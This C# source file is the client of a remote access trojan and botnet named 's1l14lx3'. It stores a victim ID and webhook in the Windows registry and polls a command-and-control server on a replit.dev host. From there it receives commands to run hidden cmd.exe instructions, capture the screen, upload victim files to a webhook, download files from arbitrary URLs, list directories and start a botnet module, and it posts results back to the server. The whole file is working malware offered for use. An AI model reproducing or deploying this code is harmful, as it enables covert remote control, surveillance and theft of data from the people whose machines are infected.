using Codeplex.Data;
using Microsoft.Win32;
using Newtonsoft.Json;
using s1l14lx3;
using System;
using System.Collections;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Reflection.Metadata;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using static System.Windows.Forms.DataFormats;

public class Program
{
    //debug setting

    //end
    public static void Main(string[] args)
    {
        //debug
        string A = "a";
        ToastExtensions.Show(A);
        //end
        AsyncMain();
        Tools.Wait();
    }
    private static async void AsyncMain()
    {
        //setup
        bool WiFi = S1l14lx3.CheckWiFi();
        while (!WiFi)
        {
            WiFi = S1l14lx3.CheckWiFi();
            Thread.Sleep(10000);
        }
        bool Server = false;
        while (!Server)
        {
            string res = await S1l14lx3_Module.RAW_POST("https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev", "wake");
            if (res == "wake")
            {
                Server = true;
                break;
            }
            Console.WriteLine("Server is invalid");
            await Task.Delay(1000 * 60 * 1 / 2);
        }
        string chid = S1l14lx3_Module.GETID();
        string wh = S1l14lx3_Module.GETWH();
        string encodedWH = "";
        if (chid != null && chid != "Error" && chid != "")
        {
            Import.ID = chid;
        }
        else
        {
            string ID;
            var characters = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM";
            var Charsarr = new char[7];
            var random = new Random();
            for (int i = 0; i < Charsarr.Length; i++)
            {
                Charsarr[i] = characters[random.Next(characters.Length)];
            }
            var resultString = new String(Charsarr);
            ID = resultString;
            Import.ID = ID;
            Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "ID", ID);
        }
        if (wh != null && wh != "Error" && wh != "")
        {
            byte[] compressedData = Convert.FromBase64String(wh);
            string decompressedData = Tools.DecompressData(compressedData);
            Import.Webhook = decompressedData;
        }
        else
        {
            encodedWH = await S1l14lx3_Module.ADD_POST(Import.ID);
            await S1l14lx3_Module.DATA_POST($"{Import.ID}:Created new user {Import.ID}.\nPlease set command.");
            while (encodedWH == "" || encodedWH == null || encodedWH == "null" || encodedWH == "Null")
            {
                encodedWH = S1l14lx3_Module.GET("/wh/" + Import.ID);
            }
            Registry.SetValue(@"HKEY_CURRENT_USER\s1l14lx3", "Webhook", encodedWH);
            byte[] compressedData = Convert.FromBase64String(encodedWH);
            string decompressedData = Tools.DecompressData(compressedData);
            Import.Webhook = decompressedData;
        }
        //remote access start
        S1l14lx3.RunMain = true;
        S1l14lx3.MainThread.Start();
        S1l14lx3.SubThread.Start();
    }
}
public class S1l14lx3
{
    public static Thread MainThread = new Thread(MAIN_THREAD);
    public static Thread SubThread = new Thread(SUB_THREAD);
    public static Thread ModuleThread;
    public static bool RunMain = true;
    public static bool RunSub = true;

    public static async void MAIN_THREAD()
    {
        if (Import.ID == "" || Import.ID == null)
        {
            Import.ID = S1l14lx3_Module.GETID();
        }
        string BeforeCMD = "";
        while (RunMain)
        {
            string GetCommand = S1l14lx3_Module.GET("/cmd/" + Import.ID);
            if (GetCommand == "Error")
            {
                continue;
            }
            string[] Command = { };
            RemoteCommand data = JsonConvert.DeserializeObject<RemoteCommand>(GetCommand);
            if (data == null)
            {
                continue;
            }
            else
            {
                Command = new string[] { data.Command, Tools.Base64Decode(data.Option), data.Roop.ToString() };
            }
            if (GetCommand == BeforeCMD)
            {
                continue;
            }
            else if (GetCommand == "")
            {
                continue;
            }
            if (data.Roop == false)
            {
                BeforeCMD = GetCommand;
            }
            switch (Command[0])
            {
                //Windows Command Prompt
                case "wcp":
                    ModuleThread = new Thread(S1l14lx3_Module.WCP);
                    ModuleThread.Start(Command);
                    break;
                //Screen Capture
                case "scc":
                    ModuleThread = new Thread(S1l14lx3_Module.SCC);
                    ModuleThread.Start(Command);
                    break;
                //File upload
                case "upload":
                    ModuleThread = new Thread(S1l14lx3_Module.UPLOAD);
                    ModuleThread.Start(Command);
                    break;
                //File download
                case "download":
                    ModuleThread = new Thread(S1l14lx3_Module.DOWNLOAD);
                    ModuleThread.Start(Command);
                    break;
                //Directory & File List
                case "d&fl":
                    ModuleThread = new Thread(S1l14lx3_Module.DFL);
                    ModuleThread.Start(Command);
                    break;
                //Comment
                case "message":
                    //Code
                    break;
                //Exit
                case "exit":
                    await S1l14lx3_Module.DATA_POST($"プログラムを終了しました\nID : ```{Import.ID}```");
                    Environment.Exit(0);
                    break;
                //Default
                default:
                    continue;
                    /*/
                       //Comment
                    case "CMD":
                        //Code
                        break;
                    /*/
            }
            await Task.Delay(10);
        }
    }
    public static async void SUB_THREAD()
    {
        string BeforeCMD = "";
        while (RunSub)
        {
            string GetCommand = S1l14lx3_Module.GET("/cmd/ALL");
            if (GetCommand == "Error")
            {
                continue;
            }
            string[] Command = { };
            ALLRemoteCommand data = JsonConvert.DeserializeObject<ALLRemoteCommand>(GetCommand);
            if (data == null)
            {
                continue;
            }
            else
            {
                Command = new string[] { data.Command, Tools.Base64Decode(data.Option), data.Roop.ToString() };
            }
            if (GetCommand == BeforeCMD)
            {
                continue;
            }
            else if (GetCommand == "")
            {
                continue;
            }
            if (data.Roop == false)
            {
                BeforeCMD = GetCommand;
            }
            switch (Command[0])
            {
                //Windows Command Prompt
                case "wcp":
                    ModuleThread = new Thread(S1l14lx3_Module.WCP);
                    ModuleThread.Start(Command);
                    break;
                //Screen Capture
                case "scc":
                    ModuleThread = new Thread(S1l14lx3_Module.SCC);
                    ModuleThread.Start(Command);
                    break;
                //File upload
                case "upload":
                    ModuleThread = new Thread(S1l14lx3_Module.UPLOAD);
                    ModuleThread.Start(Command);
                    break;
                //File download
                case "download":
                    ModuleThread = new Thread(S1l14lx3_Module.DOWNLOAD);
                    ModuleThread.Start(Command);
                    break;
                //Directory & File List
                case "d&fl":
                    ModuleThread = new Thread(S1l14lx3_Module.DFL);
                    ModuleThread.Start(Command);
                    break;
                //BotNet Module start
                case "bnms":
                    ModuleThread = new Thread(S1l14lx3_Module.BNMs);
                    ModuleThread.Start(Command);
                    break;
                //Exit
                case "exit":
                    await S1l14lx3_Module.DATA_POST($"プログラムを終了しました\nID : ```{Import.ID}```");
                    Environment.Exit(0);
                    break;
                //Default
                default:
                    continue;
            }
            await Task.Delay(10);
        }
    }
    public static bool CheckWiFi()
    {
        if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
        {
            return true;
        }
        else
        {
            return false;
        }
    }
}
public class S1l14lx3_Module
{
    static string Dir = Directory.GetCurrentDirectory();
    //command module
    public static async void WCP(object Obj)
    {
        string[] CMD = (string[])Obj;
        Console.WriteLine(CMD[1]);
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd";
        psi.Arguments = "/c " + CMD[1];
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        Process process = new Process();
        process.StartInfo = psi;
        process.Start();
        var SOutput = process.StandardOutput.ReadToEnd();
        var SError = process.StandardError.ReadToEnd();
        await DATA_POST($"```Exit Code : {process.ExitCode}\nStandardOutput :\n{SOutput}\nStandardError :\n{SError}```");
    }
    public static async void SCC(object Obj)
    {
        Process p = Process.Start(Dir + @"\SCC.exe");
        p.WaitForExit();
        await PNG_POST(@"C:\Windows\Temp\TSCS");
    }
    public static async void UPLOAD(object Obj)
    {
        string[] CMD = (string[])Obj;
        await FILE_POST(CMD[1]);
    }
    public static async void DOWNLOAD(object Obj)
    {
        string[] CMD = (string[])Obj;
        string[] raw = CMD[1].Split(" ");
        string FileURL = raw[0];
        string Filepath = raw[1];
        FILE_GET(FileURL, Filepath);
    }
    public static async void DFL(object Obj)
    {
        string[] CMD = (string[])Obj;
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd";
        psi.Arguments = "/c dir " + CMD[1];
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        Process process = new Process();
        process.StartInfo = psi;
        process.Start();
        var SOutput = process.StandardOutput.ReadToEnd();
        var SError = process.StandardError.ReadToEnd();
        await DATA_POST($"```Exit Code : {process.ExitCode}\nStandardOutput :\n{SOutput}\nStandardError :\n{SError}```");
    }
    public static async void BNMs(object Obj)
    {
        await DATA_POST($"BotNetを起動しました");
        BNM.Start();
    }
    //end
    public static string GETID()
    {
        try
        {
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("s1l14lx3"))
            {
                object value = key.GetValue("ID");
                if (value == null)
                {
                    return "Error";
                }
                return value.ToString();
            }
        }
        catch
        {
            return "Error";
        }
    }
    public static string GETWH()
    {
        try
        {
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("s1l14lx3"))
            {
                object value = key.GetValue("Webhook");
                if (value == null)
                {
                    return "Error";
                }
                return value.ToString();
            }
        }
        catch
        {
            return "Error";
        }
    }
    public static async Task<string> FILE_POST(string filepath)
    {
        using (var con = new MultipartFormDataContent())
        {
            HttpClient client = new HttpClient();
            byte[] fileBytes = File.ReadAllBytes(filepath);
            con.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(filepath));
            HttpResponseMessage response = await client.PostAsync(new Uri(Import.Webhook), con);
            return await response.Content.ReadAsStringAsync();
        }
    }
    public static async Task<string> PNG_POST(string filepath)
    {
        using (var con = new MultipartFormDataContent())
        {
            HttpClient client = new HttpClient();
            byte[] fileBytes = File.ReadAllBytes(filepath);
            con.Add(new ByteArrayContent(fileBytes), "png", "SCC.png");
            HttpResponseMessage response = await client.PostAsync(new Uri(Import.Webhook), con);
            return await response.Content.ReadAsStringAsync();
        }
    }
    public static async Task<string> ADD_POST(string id)
    {
        string cnt;
        using (HttpClient httpClient = new HttpClient())
        {
            StringContent content = new StringContent($"s1l14lx3:add:{id}", Encoding.UTF8, "text/plain");
            HttpResponseMessage response = await httpClient.PostAsync($"https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev", content);
            cnt = await response.Content.ReadAsStringAsync();
        }
        return cnt;
    }
    public static async Task<string> RAW_POST(string URL, string raw)
    {
        string cnt;
        using (HttpClient httpClient = new HttpClient())
        {
            StringContent content = new StringContent(raw, Encoding.UTF8, "text/plain");
            HttpResponseMessage response = await httpClient.PostAsync(URL, content);
            cnt = await response.Content.ReadAsStringAsync();
        }
        return cnt;
    }
    public static async Task<string> ALLLOG_POST(string Data)
    {
        try
        {
            string cnt;
            using (HttpClient httpClient = new HttpClient())
            {
                StringContent content = new StringContent($"s1l14lx3:alllog:{Data}", Encoding.UTF8, "text/plain");
                HttpResponseMessage response = await httpClient.PostAsync($"https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev", content);
                cnt = await response.Content.ReadAsStringAsync();
            }
            return cnt;
        }
        catch
        {
            return "Error";
        }
    }
    public static async Task<string> DATA_POST(string Data)
    {
        try
        {
            string cnt;
            using (HttpClient httpClient = new HttpClient())
            {
                StringContent content = new StringContent($"s1l14lx3:data:{Import.ID}:{Data}", Encoding.UTF8, "text/plain");
                HttpResponseMessage response = await httpClient.PostAsync($"https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev", content);
                cnt = await response.Content.ReadAsStringAsync();
            }
            return cnt;
        }
        catch
        {
            return "Error";
        }
    }
    public static string TEXT_GET(string URL)
    {
        try
        {
            using (HttpClient httpClient = new HttpClient())
            {
                WebClient web = new WebClient();
                return web.DownloadString(URL);
            }
        }
        catch (Exception ex)
        {
            return "Error : " + ex.Message;
        }
    }
    public static string FILE_GET(string URL, string Filepath)
    {
        try
        {
            WebClient wc = new WebClient();
            wc.DownloadFile(URL, Filepath);
            wc.Dispose();
            return "Succes";
        }
        catch (Exception ex)
        {
            return "Error : " + ex.Message;
        }
    }
    public static string GET(string URL)
    {
        try
        {
            using (HttpClient httpClient = new HttpClient())
            {
                WebClient web = new WebClient();
                string raw = web.DownloadString("https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev" + URL);
                string contentType = web.ResponseHeaders["Content-Type"];
                bool isTextPlain = contentType != null && contentType.StartsWith("text/plain");
                if (!isTextPlain)
                {
                    raw = "Error";
                }
                return raw;
            }
        }
        catch(Exception ex)
        {
            return "Error";
        }
    }
}
